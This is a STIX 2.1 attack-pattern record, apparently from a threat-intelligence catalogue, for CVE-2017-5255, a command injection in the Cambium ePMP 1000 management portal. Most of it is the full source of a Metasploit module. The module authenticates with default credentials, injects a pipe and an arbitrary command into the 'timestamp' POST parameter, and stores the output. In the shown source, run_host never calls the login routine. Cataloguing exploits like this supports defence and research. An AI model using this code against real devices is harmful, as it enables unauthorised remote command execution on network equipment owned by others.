{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--f9a20bf5-c58a-4578-af77-476c0cb25895",
    "created": "2024-08-14T16:28:55.459099Z",
    "modified": "2024-08-14T16:28:55.459103Z",
    "name": "\"Cambium ePMP 1000 get_chart Command Injection (v3.1-3.5-RC7)\"",
    "description": " This module exploits an OS Command Injection vulnerability in Cambium ePMP 1000 (v3.1-3.5-RC7) device management portal. It requires any one of the following login credentials - admin/admin, installer/installer, home/home - to execute arbitrary system commands. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/scanner/http/epmp1000_get_chart_cmd_exec.rb",
            "external_id": "epmp1000_get_chart_cmd_exec.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2017-5255"
        },
        {
            "source_name": "reference",
            "url": "https://www.rapid7.com/blog/post/2017/12/19/r7-2017-25-cambium-epmp-and-cnpilot-multiple-vulnerabilities/"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Auxiliary::EPMP\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name' => \"Cambium ePMP 1000 'get_chart' Command Injection (v3.1-3.5-RC7)\",\n      'Description' => %{\n          This module exploits an OS Command Injection vulnerability in Cambium\n          ePMP 1000 (v3.1-3.5-RC7) device management portal. It requires any one of the\n          following login credentials - admin/admin, installer/installer, home/home - to\n          execute arbitrary system commands.\n      },\n      'Author' =>\n        [\n          'Karn Ganeshen <KarnGaneshen[at]gmail.com>'\n        ],\n      'References' =>\n        [\n          ['CVE', '2017-5255'],\n          ['URL', 'https://www.rapid7.com/blog/post/2017/12/19/r7-2017-25-cambium-epmp-and-cnpilot-multiple-vulnerabilities/']\n        ],\n      'License' => MSF_LICENSE\n     )\n    )\n\n    register_options(\n      [\n        Opt::RPORT(80),\t# Application may run on a different port too. Change port accordingly.\n        OptString.new('USERNAME', [true, 'A specific username to authenticate as', 'installer']),\n        OptString.new('PASSWORD', [true, 'A specific password to authenticate with', 'installer']),\n        OptString.new('CMD', [true, 'Command(s) to run', 'id; pwd'])\n      ], self.class\n    )\n\n    deregister_options('DB_ALL_CREDS', 'DB_ALL_PASS', 'DB_ALL_USERS', 'USER_AS_PASS', 'USERPASS_FILE', 'USER_FILE', 'PASS_FILE', 'BLANK_PASSWORDS', 'BRUTEFORCE_SPEED', 'STOP_ON_SUCCESS')\n  end\n\n  def run_host(ip)\n    unless is_app_epmp1000?\n      return\n    end\n  end\n\n  # Command Execution\n  def cmd_exec(config_uri, cookie)\n    command = datastore['CMD']\n    inject = '|' + \"#{command}\"\n    clean_inject = CGI.unescapeHTML(inject.to_s)\n\n    print_status(\"#{rhost}:#{rport} - Executing #{command}\")\n    res = send_request_cgi(\n      {\n        'method' => 'POST',\n        'uri' => config_uri,\n        'cookie' => cookie,\n        'headers' => {\n          'Accept' => '*/*',\n          'Accept-Language' => 'en-US,en;q=0.5',\n          'Content-Encoding' => 'application/x-www-form-urlencoded; charset=UTF-8',\n          'X-Requested-With' => 'XMLHttpRequest',\n          'Connection' => 'close'\n        },\n        'vars_post' =>\n          {\n            'measure' => 's', # This parameter can also be used for injection\n            'timestamp' => clean_inject,\n            'debug' => 0\n          }\n      }, 25\n    )\n\n    good_response = (\n      res &&\n      res.code == 200\n    )\n\n    if good_response\n      path = store_loot('ePMP_cmd_exec', 'text/plain', rhost, res.body, 'Cambium ePMP 1000 Command Exec Results')\n      print_status(\"#{rhost}:#{rport} - Results saved in: #{path}\")\n    else\n      print_error(\"#{rhost}:#{rport} - Failed to execute command(s).\")\n    end\n  end\n\n  #\n  # Login & initiate cmd_exec\n  #\n\n  def do_login(epmp_ver)\n    if (epmp_ver < '3.1' || epmp_ver > '3.5' && epmp_ver != '3.5-RC7')\n      print_error('This module is applicable to versions 3.1-3.5-RC7 only. Exiting now.')\n      return\n    elsif (epmp_ver >= '3.1' && epmp_ver < '3.4.1') # <3.4.1 uses login_1\n      cookie, _blah1, _blah2, config_uri_get_chart = login_1(datastore['USERNAME'], datastore['PASSWORD'], epmp_ver)\n      if cookie == 'skip' && config_uri_get_chart == 'skip'\n        return\n      else\n        cmd_exec(config_uri_get_chart, cookie)\n      end\n    elsif ['3.4.1', '3.5', '3.5-RC7'].include?(epmp_ver) # 3.4.1+ uses login_2\n      cookie, _blah1, _blah2, config_uri_get_chart = login_2(datastore['USERNAME'], datastore['PASSWORD'], epmp_ver)\n      if cookie == 'skip' && config_uri_get_chart == 'skip'\n        return\n      else\n        cmd_exec(config_uri_get_chart, cookie)\n      end\n    end\n  end\nend\n"
}